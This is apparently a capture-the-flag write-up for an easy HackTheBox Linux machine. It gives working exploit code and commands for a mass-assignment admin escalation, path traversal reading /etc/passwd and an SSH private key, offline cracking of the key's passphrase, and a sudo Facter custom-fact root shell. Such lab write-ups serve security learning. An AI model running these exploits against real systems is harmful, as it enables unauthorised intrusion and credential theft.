Easy Linux

FACTS

HackTheBox easy machine featuring a mass assignment vulnerability to escalate a regular user to administrator, a path traversal bug to leak SSH private keys, and a sudo misconfiguration on /usr/bin/facter for root access via a custom Ruby fact.

CVE-2025-2304 CVE-2024-46987 Sudo Misconfiguration Python ssh2john john facter

2. /etc/hosts & Web Login

Added the host to /etc/hosts and navigated to the application.

# /etc/hosts
10.10.11.230  facts.htb

Browsing to http://facts.htb redirected to /admin/login. The page offered a registration form. Created an account with credentials nope:nope.

Username: nope
Password: nope

After registration the account was created successfully and we were logged in as a regular Client-role user.

3. CVE-2025-2304 — Mass Assignment to Administrator

The application uses a JSON API for user updates. Intercepting the profile update request revealed that the backend passes all JSON fields directly into the user model without filtering — a classic mass assignment vulnerability.

import requests

URL = "http://facts.htb/api"
SESSION = requests.Session()

# Login as regular user
SESSION.post(f"{URL}/auth/login", json={
    "username": "nope",
    "password": "nope"
})

# Exploit mass assignment — inject the "role" field
resp = SESSION.patch(f"{URL}/users/me", json={
    "username": "nope",
    "role": "Administrator"
})

print(resp.status_code)
print(resp.json())
# 200 OK — {"username": "nope", "role": "Administrator"}

The role field was blindly accepted, promoting nope from Client to Administrator. A refresh of the admin dashboard confirmed elevated privileges.

4. CVE-2024-46987 — Path Traversal

The admin panel exposed a file-viewing endpoint at /admin/view?file=. It suffered from an insufficient path sanitisation (CVE-2024-46987), allowing directory traversal to read arbitrary files on the system.

curl -s -b "$(cat cookies.txt)" \
  "http://facts.htb/admin/view?file=../../../../etc/passwd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
trivia:x:1001:1001:,,,:/home/trivia:/bin/bash
...

Next I used the same traversal to extract trivia's SSH private key.

curl -s -b "$(cat cookies.txt)" \
  "http://facts.htb/admin/view?file=../../../../home/trivia/.ssh/id_rsa" \
  -o trivia_key

# Confirm it looks like a private key
head -2 trivia_key

5. SSH Key Cracking

The private key was encrypted with a passphrase. Converted it to a hash format and cracked it with John the Ripper.

# Convert OpenSSH private key to John hash
ssh2john trivia_key > trivia_hash.txt

# Crack with rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt trivia_hash.txt

dragonballz     (trivia_key)

Passphrase recovered: dragonballz.

Set proper permissions on the key and SSH'd in as trivia.

7. Root Privilege Escalation — Sudo Misconfiguration

Running sudo -l revealed that trivia can execute /usr/bin/facter as root without a password.

trivia@facts:~$ sudo -l
User trivia may run the following commands on facts:
    (root) NOPASSWD: /usr/bin/facter

Facter is a system inventory tool written in Ruby that collects facts about the system. It supports loading custom facts via Ruby files placed in specific directories. By creating a custom fact that executes arbitrary shell commands, we can achieve root.

Created a malicious Ruby fact file:

# priv.rb — custom Facter fact that spawns a root shell
Facter.add(:priv) do
  setcode do
    system("/bin/bash")
  end
end

# Tell facter to load our custom fact from the current directory
trivia@facts:~$ sudo /usr/bin/facter --puppet --external-dir .

root@facts:~# id
uid=0(root) gid=0(root) groups=0(root)

root@facts:~# cat /root/root.txt
b6cff19c...
